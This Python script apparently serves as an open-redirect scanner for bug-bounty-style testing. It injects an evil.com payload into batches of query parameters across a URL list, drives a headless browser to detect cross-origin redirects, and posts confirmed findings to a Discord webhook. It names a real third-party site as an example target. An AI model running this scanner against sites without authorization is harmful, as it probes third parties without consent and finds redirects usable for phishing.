#!/usr/bin/env python3

import argparse
import os
import sys
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError


PAYLOAD = "https://evil.com/"
DEFAULT_BATCH_SIZE = 100
DEFAULT_TIMEOUT = 20000
DEFAULT_DELAY = 1.0


USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/128.0.0.0 Safari/537.36"
)


def load_urls(path):
    """Load HTTP/HTTPS URLs without modifying their paths."""

    urls = []

    with open(
        path,
        "r",
        encoding="utf-8",
        errors="ignore",
    ) as f:

        for line in f:
            url = line.strip()

            if not url:
                continue

            if url.startswith("http://") or url.startswith("https://"):
                urls.append(url)

    return urls


def load_parameters(path):
    """
    Load ONLY parameter names from fuzz-params-list.txt.

    Supported:

        next
        redirect
        url

    and:

        ?next=test&redirect=test&url=test

    No parameters are extracted from target responses,
    JSON bodies, POST bodies, HTML, or JavaScript.
    """

    parameters = []
    seen = set()

    with open(
        path,
        "r",
        encoding="utf-8",
        errors="ignore",
    ) as f:

        for line in f:

            line = line.strip()

            if not line:
                continue

            if line.startswith("?"):
                line = line[1:]

            # Query-string style.
            if "=" in line or "&" in line:

                for name, _ in parse_qsl(
                    line,
                    keep_blank_values=True,
                ):

                    name = name.strip()

                    if name and name not in seen:
                        seen.add(name)
                        parameters.append(name)

            else:

                name = line.strip()

                if name and name not in seen:
                    seen.add(name)
                    parameters.append(name)

    return parameters


def build_test_url(base_url, parameters):
    """
    Modify ONLY the query string.

    The original scheme, hostname, path and fragment
    remain unchanged.

    Example:

        https://example.com/a/b

    becomes:

        https://example.com/a/b?next=https%3A%2F%2Fevil.com%2F

    Never:

        https://example.com/a/https:/evil.com/
    """

    parts = urlsplit(base_url)

    original_query = parse_qsl(
        parts.query,
        keep_blank_values=True,
    )

    tested_names = set(parameters)

    # Preserve existing parameters that are not being tested.
    preserved = [
        (name, value)
        for name, value in original_query
        if name not in tested_names
    ]

    # ONLY parameters from fuzz-params-list.txt receive the payload.
    injected = [
        (name, PAYLOAD)
        for name in parameters
    ]

    new_query = urlencode(
        preserved + injected,
        doseq=True,
    )

    # IMPORTANT:
    # parts.path is used unchanged.
    return urlunsplit(
        (
            parts.scheme,
            parts.netloc,
            parts.path,
            new_query,
            parts.fragment,
        )
    )


def is_confirmed_redirect(original_url, final_url):
    """
    Confirm only a real cross-origin redirect to evil.com.

    Examples:

        https://evil.com/
        https://evil.com/test
        https://evil.com/?x=1

    are confirmed.

    This is NOT confirmed:

        https://chaturbate.com/v2apps/apps/https:/evil.com/

    because the final hostname is still chaturbate.com.
    """

    try:

        original = urlsplit(original_url)
        final = urlsplit(final_url)

        final_hostname = (
            final.hostname.lower()
            if final.hostname
            else ""
        )

        original_hostname = (
            original.hostname.lower()
            if original.hostname
            else ""
        )

        if final.scheme.lower() != "https":
            return False

        if final_hostname != "evil.com":
            return False

        if final_hostname == original_hostname:
            return False

        return True

    except Exception:
        return False


def send_discord(
    webhook,
    base_url,
    test_url,
    final_url,
    parameters,
):
    """Send confirmed findings to Discord."""

    if not webhook:
        print(
            "       ⚠️ "
            "DISCORD_WEBHOOK_URL is not configured."
        )
        return

    message = {
        "content": "🔴 **JS Redirect Vulnerability Confirmed**",
        "embeds": [
            {
                "title": "Confirmed Redirect",
                "description": (
                    f"**Original URL:**\n"
                    f"{base_url}\n\n"
                    f"**Test URL:**\n"
                    f"{test_url}\n\n"
                    f"**Final URL:**\n"
                    f"{final_url}\n\n"
                    f"**Parameters:**\n"
                    f"{', '.join(parameters)}\n\n"
                    f"**Payload:**\n"
                    f"{PAYLOAD}"
                ),
            }
        ],
    }

    try:

        response = requests.post(
            webhook,
            json=message,
            timeout=10,
        )

        response.raise_for_status()

        print(
            "       📣 Discord notification sent."
        )

    except Exception as exc:

        print(
            "       ⚠️ Discord notification failed: "
            f"{exc}"
        )


def scan_page(
    page,
    base_url,
    parameters,
    timeout,
):
    """Navigate to one generated URL and return final URL."""

    test_url = build_test_url(
        base_url,
        parameters,
    )

    try:

        page.goto(
            test_url,
            wait_until="domcontentloaded",
            timeout=timeout,
        )

        # Allow client-side redirects to execute.
        page.wait_for_timeout(1500)

        # IMPORTANT:
        # page.url is a string property in Playwright Python.
        final_url = page.url

        return test_url, final_url

    except PlaywrightTimeoutError:

        # Even when navigation times out, the page may have
        # already redirected somewhere useful.
        final_url = page.url

        return test_url, final_url

    except Exception as exc:

        print(
            f"       ⚠️ Navigation error: {exc}"
        )

        return test_url, None


def main():

    parser = argparse.ArgumentParser(
        description=(
            "Test supplied query parameters for "
            "JavaScript/open redirects."
        )
    )

    parser.add_argument(
        "-l",
        "--list",
        required=True,
        help="URL list",
    )

    parser.add_argument(
        "-p",
        "--params",
        required=True,
        help="Parameter list",
    )

    parser.add_argument(
        "-o",
        "--output",
        default="js_redirect_vulnerable.txt",
        help="Output findings file",
    )

    parser.add_argument(
        "--batch-size",
        type=int,
        default=DEFAULT_BATCH_SIZE,
        help="Parameters per request. Default: 100",
    )

    parser.add_argument(
        "-t",
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help="Browser navigation timeout in milliseconds",
    )

    parser.add_argument(
        "-d",
        "--delay",
        type=float,
        default=DEFAULT_DELAY,
        help="Delay between requests",
    )

    args = parser.parse_args()

    if args.batch_size < 1:
        print(
            "[-] Batch size must be greater than 0."
        )
        return 1

    if not os.path.isfile(args.list):

        print(
            f"[-] URL list not found: {args.list}"
        )

        return 1

    if not os.path.isfile(args.params):

        print(
            f"[-] Parameter list not found: {args.params}"
        )

        return 1

    urls = load_urls(args.list)

    parameters = load_parameters(args.params)

    if not urls:

        print(
            "[-] No HTTP/HTTPS URLs found."
        )

        return 0

    if not parameters:

        print(
            "[-] No parameters found."
        )

        return 1

    # Split ONLY the supplied fuzz parameters.
    batches = [
        parameters[i:i + args.batch_size]
        for i in range(
            0,
            len(parameters),
            args.batch_size,
        )
    ]

    webhook = os.environ.get(
        "DISCORD_WEBHOOK_URL",
        "",
    ).strip()

    print()
    print(
        "[+] JS Redirect Tester"
    )

    print(
        f"[+] URLs        : {len(urls)}"
    )

    print(
        f"[+] Parameters  : {len(parameters)}"
    )

    print(
        f"[+] Batch size  : {args.batch_size}"
    )

    print(
        f"[+] Requests/URL: {len(batches)}"
    )

    print(
        f"[+] Payload     : {PAYLOAD}"
    )

    print()

    findings = []
    finding_keys = set()

    with sync_playwright() as playwright:

        browser = playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
            ],
        )

        context = browser.new_context(
            user_agent=USER_AGENT,
        )

        page = context.new_page()

        try:

            for index, base_url in enumerate(
                urls,
                1,
            ):

                print(
                    f"[{index}/{len(urls)}] "
                    f"{base_url}"
                )

                for batch_index, batch in enumerate(
                    batches,
                    1,
                ):

                    print(
                        f"    → Batch "
                        f"{batch_index}/{len(batches)} "
                        f"({len(batch)} parameters)"
                    )

                    test_url, final_url = scan_page(
                        page,
                        base_url,
                        batch,
                        args.timeout,
                    )

                    if final_url is None:
                        continue

                    # Show final browser URL.
                    print(
                        f"       ✓ Final URL: "
                        f"{final_url}"
                    )

                    # Confirm ONLY actual evil.com navigation.
                    if is_confirmed_redirect(
                        base_url,
                        final_url,
                    ):

                        key = (
                            base_url,
                            final_url,
                            tuple(batch),
                        )

                        if key in finding_keys:
                            continue

                        finding_keys.add(key)

                        print()
                        print(
                            "       🔴 "
                            "CONFIRMED REDIRECT!"
                        )

                        print(
                            f"       Final URL: "
                            f"{final_url}"
                        )

                        finding = {
                            "base_url": base_url,
                            "test_url": test_url,
                            "final_url": final_url,
                            "parameters": batch,
                        }

                        findings.append(
                            finding
                        )

                        send_discord(
                            webhook,
                            base_url,
                            test_url,
                            final_url,
                            batch,
                        )

                    time.sleep(
                        max(args.delay, 0)
                    )

        finally:

            browser.close()

    # Write findings.
    with open(
        args.output,
        "w",
        encoding="utf-8",
    ) as output:

        for finding in findings:

            output.write(
                f"Original URL: "
                f"{finding['base_url']}\n"
            )

            output.write(
                f"Test URL: "
                f"{finding['test_url']}\n"
            )

            output.write(
                "JS REDIRECT VULNERABLE!\n"
            )

            output.write(
                f"Final URL: "
                f"{finding['final_url']}\n"
            )

            output.write(
                "Parameters: "
                + ", ".join(
                    finding["parameters"]
                )
                + "\n"
            )

            output.write(
                f"Payload: {PAYLOAD}\n"
            )

            output.write(
                "----------------------------------------\n"
            )

    print()
    print(
        "[+] Scan completed."
    )

    print(
        f"[+] Confirmed findings: "
        f"{len(findings)}"
    )

    print(
        f"[+] Results saved to: "
        f"{args.output}"
    )

    return 0


if __name__ == "__main__":
    sys.exit(main())
